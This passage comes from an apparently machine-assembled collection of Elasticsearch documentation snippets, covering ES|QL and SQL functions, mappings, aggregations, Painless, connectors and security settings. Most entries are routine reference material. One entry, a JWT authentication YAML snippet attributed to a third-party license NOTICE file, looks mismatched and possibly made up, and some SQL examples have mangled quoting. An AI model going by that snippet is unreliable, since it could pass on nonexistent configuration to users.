javascript\nCODE:\n```\n{\n  \"reroute\": {\n    \"tag\": \"nginx\",\n    \"if\" : \"ctx?.log?.file?.path?.contains('nginx')\",\n    \"dataset\": \"nginx\"\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Setting Email Defaults in Elasticsearch YAML\nDESCRIPTION: Configures optional default attributes for emails sent from an account, following the email action attributes format.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/watcher-settings.md#2025-04-21_snippet_8\n\nLANGUAGE: yaml\nCODE:\n```\nemail_defaults.*\n```\n\n----------------------------------------\n\nTITLE: Registering an Elasticsearch Test Cluster\nDESCRIPTION: Example of lazily registering an Elasticsearch test cluster using the testClusters API, which improves Gradle configuration efficiency by creating clusters only when needed.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/BUILDING.md#2025-04-21_snippet_4\n\nLANGUAGE: groovy\nCODE:\n```\ndef someClusterProvider = testClusters.register('someCluster') { ... }\n```\n\n----------------------------------------\n\nTITLE: Installing Elasticsearch Plugin from HTTPS URL with Self-Signed Certificate\nDESCRIPTION: This command installs an Elasticsearch plugin from an HTTPS URL with a self-signed certificate. It requires adding the CA cert to a local Java truststore and specifying its location.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/plugin-management-custom-url.md#2025-04-21_snippet_4\n\nLANGUAGE: shell\nCODE:\n```\nsudo CLI_JAVA_OPTS=\"-Djavax.net.ssl.trustStore=/path/to/trustStore.jks\" bin/elasticsearch-plugin install https://host/plugin.zip\n```\n\n----------------------------------------\n\nTITLE: DATETIME_FORMAT Syntax\nDESCRIPTION: Defines the syntax for the DATETIME_FORMAT function in Elasticsearch SQL. This function formats a date, datetime, or time expression into a string based on a specified format pattern.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-datetime.md#2025-04-21_snippet_42\n\nLANGUAGE: sql\nCODE:\n```\n\"DATETIME_FORMAT(\n    date_exp/datetime_exp/time_exp, <1>\n    string_exp) <2>\"\n```\n\n----------------------------------------\n\nTITLE: ESQL Numeric Type Mapping Table\nDESCRIPTION: Markdown table showing type conversion mappings for numeric types in ESQL functions. Documents that double, integer and long input types all result in double output type.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/types/median.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n| number | result |\n| --- | --- |\n| double | double |\n| integer | double |\n| long | double |\n```\n\n----------------------------------------\n\nTITLE: Using MV_DEDUPE Function in ESQL\nDESCRIPTION: This example demonstrates how to use the MV_DEDUPE function to remove duplicate values from a multi-value array. The function takes an array and returns a new array with all duplicate values removed, preserving only the first occurrence of each value.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/mv_dedupe.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW a=[\"foo\", \"foo\", \"bar\", \"foo\"]\n| EVAL dedupe_a = MV_DEDUPE(a)\n```\n\n----------------------------------------\n\nTITLE: Text Analysis Components Markdown Documentation Structure\nDESCRIPTION: Markdown documentation structure defining the organization of text analysis components reference documentation in Elasticsearch, including notes and section links.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/index.md#2025-04-22_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n# Text analysis components\n\n% TO-DO: Add links to \"Data analysis basics\"%\n\n:::{note}\nThis section provides detailed **reference information**.\n\nRefer to [the text analysis overview](docs-content://manage-data/data-store/text-analysis.md) in the **Manage data** section for overview and conceptual information.\n:::\n\nThis section contains reference information for text analysis components features, including:\n\n* [Analyzers](/reference/text-analysis/analyzer-reference.md)\n* [Tokenizers](/reference/text-analysis/tokenizer-reference.md)\n* [Token filters](/reference/text-analysis/token-filter-reference.md)\n* [Character filters](/reference/text-analysis/character-filter-reference.md)\n* [Normalizers](/reference/text-analysis/normalizers.md)\n```\n\n----------------------------------------\n\nTITLE: Querying Elasticsearch with Rank Feature Queries\nDESCRIPTION: This snippet provides an Elasticsearch query example that searches for the term '2016' and boosts the relevance scores of results using rank_feature fields like pagerank, url_length, and topics.sports. The query utilizes the bool query type with must and should clauses to refine search results based on additional rank feature criteria.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-rank-feature-query.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nGET /test/_search\n{\n  \"query\": {\n    \"bool\": {\n      \"must\": [\n        {\n          \"match\": {\n            \"content\": \"2016\"\n          }\n        }\n      ],\n      \"should\": [\n        {\n          \"rank_feature\": {\n            \"field\": \"pagerank\"\n          }\n        },\n        {\n          \"rank_feature\": {\n            \"field\": \"url_length\",\n            \"boost\": 0.1\n          }\n        },\n        {\n          \"rank_feature\": {\n            \"field\": \"topics.sports\",\n            \"boost\": 0.4\n          }\n        }\n      ]\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Defining Java System Class Methods\nDESCRIPTION: This snippet defines the methods available from the java.lang.System class within Painless scripting. It includes `arraycopy` for efficiently copying arrays, and `currentTimeMillis` and `nanoTime` for measuring time.  The `@nondeterministic` annotation specifies the return values for `currentTimeMillis` and `nanoTime` are not consistent.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/java.lang.txt#2025-04-21_snippet_23\n\nLANGUAGE: java\nCODE:\n```\n\"class java.lang.System {\\n  void arraycopy(Object,int,Object,int,int)\\n  long currentTimeMillis() @nondeterministic\\n  long nanoTime() @nondeterministic\\n}\"\n```\n\n----------------------------------------\n\nTITLE: User Enable/Disable Object Schema for Security Config Change Events in Elasticsearch\nDESCRIPTION: Specifies the structure of a user enable or disable object in security configuration change events. It includes the user's name.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/elasticsearch-audit-events.md#2025-04-21_snippet_25\n\nLANGUAGE: javascript\nCODE:\n```\n{\"user\":{\"name\": <string>}}\n```\n\n----------------------------------------\n\nTITLE: Creating Index with Synthetic Source Keep Settings in Elasticsearch\nDESCRIPTION: This snippet demonstrates how to create an Elasticsearch index with synthetic source keep settings. It configures the index to use synthetic source mode and specifies synthetic_source_keep options for specific fields.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/mapping-source-field.md#2025-04-21_snippet_5\n\nLANGUAGE: console\nCODE:\n```\nPUT idx_keep\n{\n  \"settings\": {\n    \"index\": {\n      \"mapping\": {\n        \"source\": {\n          \"mode\": \"synthetic\"\n        }\n      }\n    }\n  },\n  \"mappings\": {\n    \"properties\": {\n      \"path\": {\n        \"type\": \"object\",\n        \"synthetic_source_keep\": \"all\"\n      },\n      \"ids\": {\n        \"type\": \"integer\",\n        \"synthetic_source_keep\": \"arrays\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Indexing WKT BBOX (Envelope) in Elasticsearch\nDESCRIPTION: Example of indexing an Envelope using the WKT BBOX format in Elasticsearch. The BBOX format follows the order: minLon, maxLon, maxLat, minLat.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/shape.md#2025-04-21_snippet_19\n\nLANGUAGE: json\nCODE:\n```\nPOST /example/_doc\n{\n  \"location\" : \"BBOX (1000.0, 1002.0, 2000.0, 1000.0)\"\n}\n```\n\n----------------------------------------\n\nTITLE: Setting up environment and building Elasticsearch distribution\nDESCRIPTION: This snippet sets the environment by navigating to the project root directory and defining the SOURCE_ROOT variable. It then builds a local Elasticsearch distribution using Gradle.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/core/src/test/resources/org/elasticsearch/xpack/security/transport/ssl/certs/simple/nodes/readme.md#2025-04-21_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\ncd <your_source_root>\nexport SOURCE_ROOT=$PWD\n./gradlew localDistro\ncd $SOURCE_ROOT/build/distribution/local/elasticsearch-<version>-SNAPSHOT\n```\n\n----------------------------------------\n\nTITLE: Executing STATS and SORT Operations in ESQL\nDESCRIPTION: This ESQL query initializes a row with scalar and array values, calculates the minimum of 'i' grouped by 'a' and 'b', and then sorts the results. It demonstrates the use of ROW, STATS, and SORT functions in ESQL.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/commands/examples/stats.csv-spec/multi-mv-group.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW i=1, a=[\"a\", \"b\"], b=[2, 3] | STATS MIN(i) BY a, b | SORT a ASC, b ASC\n```\n\n----------------------------------------\n\nTITLE: Using Instanceof Operator with 'def' Type in Painless\nDESCRIPTION: Demonstrates the usage of the instanceof operator with the 'def' type, showing implicit casting and type checking.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-operators-boolean.md#2025-04-21_snippet_9\n\nLANGUAGE: painless\nCODE:\n```\ndef d = new ArrayList();       <1>\nboolean a = d instanceof List; <2>\nboolean b = d instanceof Map;  <3>\n```\n\n----------------------------------------\n\nTITLE: Configuring Box Connector in YAML\nDESCRIPTION: YAML configuration for the Box connector, specifying Elasticsearch connection details and connector settings. It includes options for authentication and allows customization of default configurations.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-box.md#2025-04-21_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\n# When connecting to your cloud deployment you should edit the host value\nelasticsearch.host: http://host.docker.internal:9200\nelasticsearch.api_key: <ELASTICSEARCH_API_KEY>\n\nconnectors:\n  -\n    connector_id: <CONNECTOR_ID_FROM_KIBANA>\n    service_type: box\n    api_key: <CONNECTOR_API_KEY_FROM_KIBANA> # Optional. If not provided, the connector will use the elasticsearch.api_key instead\n```\n\n----------------------------------------\n\nTITLE: Silent Mode Configuration - YAML\nDESCRIPTION: YAML configuration file format for running elasticsearch-certgen in silent mode. Shows how to specify instance names, IP addresses, DNS names, and custom filenames.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/command-line-tools/certgen.md#2025-04-21_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\ninstances:\n  - name: \"node1\"\n    ip:\n      - \"192.0.2.1\"\n    dns:\n      - \"node1.mydomain.com\"\n  - name: \"node2\"\n    ip:\n      - \"192.0.2.2\"\n      - \"198.51.100.1\"\n  - name: \"node3\"\n  - name: \"node4\"\n    dns:\n      - \"node4.mydomain.com\"\n      - \"node4.internal\"\n  - name: \"CN=node5,OU=IT,DC=mydomain,DC=com\"\n    filename: \"node5\"\n```\n\n----------------------------------------\n\nTITLE: Sample Response for Reverse Nested Aggregation Query in Elasticsearch\nDESCRIPTION: This snippet shows a possible response structure for the reverse nested aggregation query. It includes aggregations for comments, top usernames, and top tags per comment, demonstrating the hierarchical nature of the results.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-reverse-nested-aggregation.md#2025-04-21_snippet_2\n\nLANGUAGE: console-result\nCODE:\n```\n{\n  \"aggregations\": {\n    \"comments\": {\n      \"doc_count\": 1,\n      \"top_usernames\": {\n        \"doc_count_error_upper_bound\" : 0,\n        \"sum_other_doc_count\" : 0,\n        \"buckets\": [\n          {\n            \"key\": \"username_1\",\n            \"doc_count\": 1,\n            \"comment_to_issue\": {\n              \"doc_count\": 1,\n              \"top_tags_per_comment\": {\n                \"doc_count_error_upper_bound\" : 0,\n                \"sum_other_doc_count\" : 0,\n                \"buckets\": [\n                  {\n                    \"key\": \"tag_1\",\n                    \"doc_count\": 1\n                  }\n                  ...\n                ]\n              }\n            }\n          }\n          ...\n        ]\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Multi-set Analysis with Significant Terms in Elasticsearch (JSON)\nDESCRIPTION: Example of using a parent-level aggregation to segment data for analysis across multiple categories.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-significantterms-aggregation.md#2025-04-21_snippet_1\n\nLANGUAGE: json\nCODE:\n```\nGET /_search\n{\n  \"aggregations\": {\n    \"forces\": {\n      \"terms\": { \"field\": \"force\" },\n      \"aggregations\": {\n        \"significant_crime_types\": {\n          \"significant_terms\": { \"field\": \"crime_type\" }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Valid REST API Compatibility Header Values for Elasticsearch\nDESCRIPTION: List of valid header values that can be used when communicating with Elasticsearch 8.x or 9.x servers to enable REST API compatibility across different content formats.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/compatibility.md#2025-04-21_snippet_1\n\nLANGUAGE: text\nCODE:\n```\n\"application/vnd.elasticsearch+json;compatible-with=8\"\n\"application/vnd.elasticsearch+yaml;compatible-with=8\"\n\"application/vnd.elasticsearch+smile;compatible-with=8\"\n\"application/vnd.elasticsearch+cbor;compatible-with=8\"\n```\n\n----------------------------------------\n\nTITLE: Running Elasticsearch Test Suite Commands\nDESCRIPTION: Commands for running the full test suite and documentation-specific tests using Gradle.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/CONTRIBUTING.md#2025-04-21_snippet_20\n\nLANGUAGE: bash\nCODE:\n```\n./gradlew check\n```\n\nLANGUAGE: bash\nCODE:\n```\n./gradlew -p docs check\n```\n\n----------------------------------------\n\nTITLE: REPEAT Function Markdown Documentation\nDESCRIPTION: Markdown documentation for the REPEAT function in ESQL. The content is generated by AbstractFunctionTestCase and should not be manually edited.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/layout/repeat.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.\n\n## `REPEAT` [esql-repeat]\n\n**Syntax**\n\n:::{image} ../../../images/functions/repeat.svg\n:alt: Embedded\n:class: text-center\n:::\n\n\n:::{include} ../parameters/repeat.md\n:::\n\n:::{include} ../description/repeat.md\n:::\n\n:::{include} ../types/repeat.md\n:::\n\n:::{include} ../examples/repeat.md\n:::\n```\n\n----------------------------------------\n\nTITLE: Defining Java StringBuffer Class Methods\nDESCRIPTION: This snippet defines the methods available from the java.lang.StringBuffer class for use in Painless scripting. It focuses on mutable string operations such as appending, deleting, inserting, replacing, and reversing characters. Also includes methods to get chars, index of substrings, and setting length of buffer.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/java.lang.txt#2025-04-21_snippet_21\n\nLANGUAGE: java\nCODE:\n```\n\"class java.lang.StringBuffer {\\n  ()\\n  (CharSequence)\\n  StringBuffer append(def)\\n  StringBuffer append(CharSequence,int,int)\\n  StringBuffer appendCodePoint(int)\\n  int capacity()\\n  int codePointAt(int)\\n  int codePointBefore(int)\\n  int codePointCount(int,int)\\n  StringBuffer delete(int,int)\\n  StringBuffer deleteCharAt(int)\\n  void getChars(int,int,char[],int)\\n  int indexOf(String)\\n  int indexOf(String,int)\\n  StringBuffer insert(int,def)\\n  int lastIndexOf(String)\\n  int lastIndexOf(String,int)\\n  int offsetByCodePoints(int,int)\\n  StringBuffer replace(int,int,String)\\n  StringBuffer reverse()\\n  void setCharAt(int,char)\\n  void setLength(int)\\n  String substring(int)\\n  String substring(int,int)\\n}\"\n```\n\n----------------------------------------\n\nTITLE: Configuring Chi Square Score\nDESCRIPTION: Implementation example of using chi square as a significance measure in the aggregation.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-significantterms-aggregation.md#2025-04-21_snippet_6\n\nLANGUAGE: javascript\nCODE:\n```\n\"chi_square\": {\n}\n```\n\n----------------------------------------\n\nTITLE: Single-Value Array Handling in Synthetic _source for Flattened Fields\nDESCRIPTION: This example illustrates how synthetic _source handles single-value arrays in flattened fields. It creates an index with synthetic _source enabled and inserts a document with a single-value array, which is converted to a single value in the result.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/flattened.md#2025-04-21_snippet_7\n\nLANGUAGE: console\nCODE:\n```\nPUT idx\n{\n  \"settings\": {\n    \"index\": {\n      \"mapping\": {\n        \"source\": {\n          \"mode\": \"synthetic\"\n        }\n      }\n    }\n  },\n  \"mappings\": {\n    \"properties\": {\n      \"flattened\": { \"type\": \"flattened\" }\n    }\n  }\n}\nPUT idx/_doc/1\n{\n  \"flattened\": {\n    \"field\": [ \"foo\" ]\n  }\n}\n```\n\nLANGUAGE: console-result\nCODE:\n```\n{\n  \"flattened\": {\n    \"field\": \"foo\"\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Storing Synchronous EQL Search in Elasticsearch\nDESCRIPTION: This snippet shows how to store a synchronous EQL search by setting 'keep_on_completion' to true. It also sets a 2-second wait for completion timeout.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/eql.md#2025-04-21_snippet_29\n\nLANGUAGE: console\nCODE:\n```\nGET /my-data-stream/_eql/search\n{\n  \"keep_on_completion\": true,\n  \"wait_for_completion_timeout\": \"2s\",\n  \"query\": \"\"\"\n    process where process.name == \"cmd.exe\"\n  \"\"\"\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Multiple Children per Parent in Elasticsearch Join Field\nDESCRIPTION: This snippet shows how to define multiple children ('answer' and 'comment') for a single parent ('question') in an Elasticsearch join field mapping.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/parent-join.md#2025-04-21_snippet_8\n\nLANGUAGE: console\nCODE:\n```\nPUT my-index-000001\n{\n  \"mappings\": {\n    \"properties\": {\n      \"my_join_field\": {\n        \"type\": \"join\",\n        \"relations\": {\n          \"question\": [\"answer\", \"comment\"]  <1>\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring PKCS#12 SSL Settings in Elasticsearch\nDESCRIPTION: Configuration settings for PKCS#12 container files (.p12 or .pfx) containing private keys, certificates, and trust certificates. Includes additional type specifications for keystore and truststore formats.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/security-settings.md#2025-04-21_snippet_25\n\nLANGUAGE: yaml\nCODE:\n```\nxpack.security.http.ssl.keystore.path\nxpack.security.http.ssl.keystore.type\nxpack.security.http.ssl.keystore.password\nxpack.security.http.ssl.keystore.secure_password\nxpack.security.http.ssl.keystore.key_password\nxpack.security.http.ssl.keystore.secure_key_password\nxpack.security.http.ssl.truststore.path\nxpack.security.http.ssl.truststore.type\nxpack.security.http.ssl.truststore.password\nxpack.security.http.ssl.truststore.secure_password\n```\n\n----------------------------------------\n\nTITLE: Configuring Transport Port in Elasticsearch YAML\nDESCRIPTION: Defines the port for inter-node communication. Accepts a single value or range. For master-eligible nodes, use a single port. The node uses the first available port if a range is specified.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/networking-settings.md#2025-04-21_snippet_2\n\nLANGUAGE: yaml\nCODE:\n```\ntransport.port: 9300-9400\n```\n\n----------------------------------------\n\nTITLE: Excluding Specific Token Types in Elasticsearch Analysis\nDESCRIPTION: Example of using the keep_types filter to exclude numeric tokens (<NUM>) from input text by setting mode to exclude.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-keep-types-tokenfilter.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nGET _analyze\n{\n  \"tokenizer\": \"standard\",\n  \"filter\": [\n    {\n      \"type\": \"keep_types\",\n      \"types\": [ \"<NUM>\" ],\n      \"mode\": \"exclude\"\n    }\n  ],\n  \"text\": \"1 quick fox 2 lazy dogs\"\n}\n```\n\n----------------------------------------\n\nTITLE: Running GCE Discovery Integration Tests\nDESCRIPTION: Maven command to execute the GCE discovery plugin integration tests. The command enables the GCE tests via a system property and specifies the path to the elasticsearch.yml configuration file.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/discovery-gce-usage-testing.md#2025-04-21_snippet_1\n\nLANGUAGE: sh\nCODE:\n```\nmvn -Dtests.gce=true -Dtests.config=/path/to/config/file/elasticsearch.yml clean test\n```\n\n----------------------------------------\n\nTITLE: Monitor Inference Privilege\nDESCRIPTION: Read-only access privilege for inference operations\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/security-privileges.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\nmonitor_inference\n```\n\n----------------------------------------\n\nTITLE: Extracting Y Coordinate with ST_Y in Elasticsearch SQL\nDESCRIPTION: Returns the latitude (Y coordinate) of the first point in a geometry. This function takes a geometry as input and returns a double value representing the Y coordinate.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-geo.md#2025-04-21_snippet_4\n\nLANGUAGE: sql\nCODE:\n```\nST_Y(\n    geometry <1>\n)\n```\n\nLANGUAGE: sql\nCODE:\n```\nSELECT ST_Y(ST_WKTToSQL('POINT (10 20)')) y;\n\n      y:d\n20.0\n```\n\n----------------------------------------\n\nTITLE: DATE_FORMAT Example: Format Time\nDESCRIPTION: Demonstrates formatting a time value using DATE_FORMAT with a specified pattern. This example shows how to format a time including milliseconds.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-datetime.md#2025-04-21_snippet_38\n\nLANGUAGE: sql\nCODE:\n```\n\"SELECT DATE_FORMAT(CAST('23:22:33.987' AS TIME), '%H %i %s.%f') AS \\\"time\\\";\\n\\n      time\n------------------\n23 22 33.987000\"\n```\n\n----------------------------------------\n\nTITLE: Stored Template Rank Evaluation Example\nDESCRIPTION: Demonstrates using a stored search template for rank evaluation.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/search-rank-eval.md#2025-04-21_snippet_3\n\nLANGUAGE: console\nCODE:\n```\nGET /my_index/_rank_eval\n{\n   [...]\n  \"templates\": [\n     {\n        \"id\": \"match_one_field_query\",  \n        \"template\": { \n            \"id\": \"match_one_field_query\"\n        }\n     }\n  ],\n  \"requests\": [...]\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Simple Pattern Split Tokenizer in Elasticsearch\nDESCRIPTION: Demonstrates how to create a custom analyzer using the simple_pattern_split tokenizer to split text on underscores, breaking input into individual terms.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-simplepatternsplit-tokenizer.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPUT my-index-000001\n{\n  \"settings\": {\n    \"analysis\": {\n      \"analyzer\": {\n        \"my_analyzer\": {\n          \"tokenizer\": \"my_tokenizer\"\n        }\n      },\n      \"tokenizer\": {\n        \"my_tokenizer\": {\n          \"type\": \"simple_pattern_split\",\n          \"pattern\": \"_\"\n        }\n      }\n    }\n  }\n}\n\nPOST my-index-000001/_analyze\n{\n  \"analyzer\": \"my_analyzer\",\n  \"text\": \"an_underscored_phrase\"\n}\n```\n\n----------------------------------------\n\nTITLE: Using ST_ENVELOPE and Min/Max Coordinate Functions in ESQL for Geographic Bounds\nDESCRIPTION: This query extracts the minimum and maximum X and Y coordinates from a city boundary. It first filters for Copenhagen airport, calculates the envelope (bounding box) of the city boundary, then extracts the minimum and maximum coordinates using ST_XMIN, ST_XMAX, ST_YMIN, and ST_YMAX functions.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/st_ymin.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nFROM airport_city_boundaries\n| WHERE abbrev == \"CPH\"\n| EVAL envelope = ST_ENVELOPE(city_boundary)\n| EVAL xmin = ST_XMIN(envelope), xmax = ST_XMAX(envelope), ymin = ST_YMIN(envelope), ymax = ST_YMAX(envelope)\n| KEEP abbrev, airport, xmin, xmax, ymin, ymax\n```\n\n----------------------------------------\n\nTITLE: Calculating Power Using POW Function in ESQL\nDESCRIPTION: This snippet demonstrates how to use the POW function in ESQL to calculate the power of a base number raised to an exponent. It creates a row with base and exponent values, then uses the EVAL command to compute the result using POW. Note that if the result overflows a double, null will be returned.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/kibana/docs/functions/pow.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW base = 2.0, exponent = 2\n| EVAL result = POW(base, exponent)\n```\n\n----------------------------------------\n\nTITLE: Creating and Using Bit Rank Vectors in Elasticsearch\nDESCRIPTION: Example showing how to create an index with a rank_vectors field using bit elements and inserting documents with bit vectors. Demonstrates both array and hexadecimal string formats for bit vectors.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/rank-vectors.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nPUT my-rank-vectors-bit\n{\n  \"mappings\": {\n    \"properties\": {\n      \"my_vector\": {\n        \"type\": \"rank_vectors\",\n        \"element_type\": \"bit\"\n      }\n    }\n  }\n}\n\nPOST /my-rank-vectors-bit/_bulk?refresh\n{\"index\": {\"_id\" : \"1\"}}\n{\"my_vector\": [127, -127, 0, 1, 42]}\n{\"index\": {\"_id\" : \"2\"}}\n{\"my_vector\": \"8100012a7f\"}\n```\n\n----------------------------------------\n\nTITLE: DATE_FORMAT Example: Format Date\nDESCRIPTION: Demonstrates formatting a date using DATE_FORMAT with a specific pattern. This example shows how to format a date as 'dd/MM/yyyy'.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-datetime.md#2025-04-21_snippet_36\n\nLANGUAGE: sql\nCODE:\n```\n\"SELECT DATE_FORMAT(CAST('2020-04-05' AS DATE), '%d/%m/%Y') AS \\\"date\\\";\\n\\n      date\n------------------\n05/04/2020\"\n```\n\n----------------------------------------\n\nTITLE: Creating Dropbox Connector via API\nDESCRIPTION: API call to create a new Dropbox connector in Elasticsearch\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-dropbox.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPUT _connector/my-dropbox-connector\n{\n  \"index_name\": \"my-elasticsearch-index\",\n  \"name\": \"Content synced from Dropbox\",\n  \"service_type\": \"dropbox\"\n}\n```\n\n----------------------------------------\n\nTITLE: Creating Index with Histogram Field in Elasticsearch\nDESCRIPTION: This code creates an index with a histogram field to store pre-aggregated latency metrics for different networks.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-metrics-sum-aggregation.md#2025-04-21_snippet_3\n\nLANGUAGE: console\nCODE:\n```\nPUT metrics_index\n{\n  \"mappings\": {\n    \"properties\": {\n      \"latency_histo\": { \"type\": \"histogram\" }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Displaying Supported Types for ESQL Function in Markdown\nDESCRIPTION: This markdown snippet presents a table showing the supported input number types and their corresponding result types for an ESQL function. It covers double, integer, long, and unsigned_long types, all resulting in double output.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/types/mv_avg.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n| number | result |\n| --- | --- |\n| double | double |\n| integer | double |\n| long | double |\n| unsigned_long | double |\n```\n\n----------------------------------------\n\nTITLE: Configuring HTTP JWT Authentication in Elasticsearch\nDESCRIPTION: YAML configuration for JWT-based authentication in Elasticsearch. This setup enables JSON Web Token authentication and specifies the JWT realm to use for validation.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/watcher/licenses/failureaccess-NOTICE.txt#2025-04-21_snippet_6\n\nLANGUAGE: yaml\nCODE:\n```\nxpack.security.http.authentication.type: jwt\nxpack.security.http.authentication.realm: jwt1\n```\n\n----------------------------------------\n\nTITLE: Including ABS Function Examples in Markdown\nDESCRIPTION: Includes the content of a separate Markdown file containing examples of using the ABS function.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/layout/abs.md#2025-04-21_snippet_4\n\nLANGUAGE: markdown\nCODE:\n```\n:::{include} ../examples/abs.md\n:::\n```\n\n----------------------------------------\n\nTITLE: Executing a Search Query with Script Fields in Elasticsearch\nDESCRIPTION: A console command example for executing a search query that applies custom Painless scripts to return calculated fields like 'day-of-week' and 'number-of-actors'. This query requires a mapped index and assumes that the field types are correctly set.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs-mdx/painless/painless-field-context.mdx#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nGET seats/_search\n{\n  \"size\": 2,\n  \"query\": {\n    \"match_all\": {}\n  },\n  \"script_fields\": {\n    \"day-of-week\": {\n      \"script\": {\n        \"source\": \"doc['datetime'].value.getDayOfWeekEnum().getDisplayName(TextStyle.FULL, Locale.ROOT)\"\n      }\n    },\n    \"number-of-actors\": {\n      \"script\": {\n        \"source\": \"doc['actors'].size()\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Extracting Month Name with MONTH_NAME in SQL\nDESCRIPTION: Extracts the month from a date/datetime expression in text format (e.g., January, February). Returns null if input is null.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-datetime.md#2025-04-21_snippet_62\n\nLANGUAGE: sql\nCODE:\n```\n\"MONTH_NAME(datetime_exp) 